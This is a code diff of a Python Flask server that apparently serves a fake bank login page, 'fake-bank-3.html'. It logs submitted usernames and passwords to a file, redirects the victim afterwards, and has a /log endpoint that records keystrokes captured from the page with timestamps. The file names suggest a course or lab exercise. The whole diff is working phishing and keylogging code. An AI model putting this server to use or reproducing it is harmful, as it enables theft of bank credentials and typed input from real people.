@@ -9,10 +9,10 @@ os.chdir(script_dir)
 
 post_log = "log-Q6.txt"
 keystroke_log = "keystrokes-Q6.txt"
+
 @app.route("/", methods=["GET", "POST"])
 def home():
     if request.method == "POST":
-        print("post method called")
         username = request.form.get("username")
         password = request.form.get("password")
 
@@ -20,21 +20,19 @@ def home():
             if f"{username},{password}" not in file.read():
                 file.write(f"{username},{password}\n")
         
-        return redirect(f'http://localhost:80', 308)
+        return redirect(URL, 308)
         
     
     return render_template('fake-bank-3.html')
 
 @app.route("/log", methods=["POST"])
 def log():
-    data = request.json
-    if not data:
-        print("NONE")
-    print(data)
-    with open(keystroke_log, "a") as file:
-        file.write(f'{data["key"]} @ {data["datetime"]}\n')
-    headers = jsonify({"status" : "success"})
-    return headers
+    if request.method == "POST":
+        data = request.json
+        with open(keystroke_log, "a") as file:
+            file.write(f'{data["key"]} @ {data["datetime"]}\n')
+        headers = jsonify({"status" : "success"})
+        return headers
     
 
 if __name__ == '__main__':
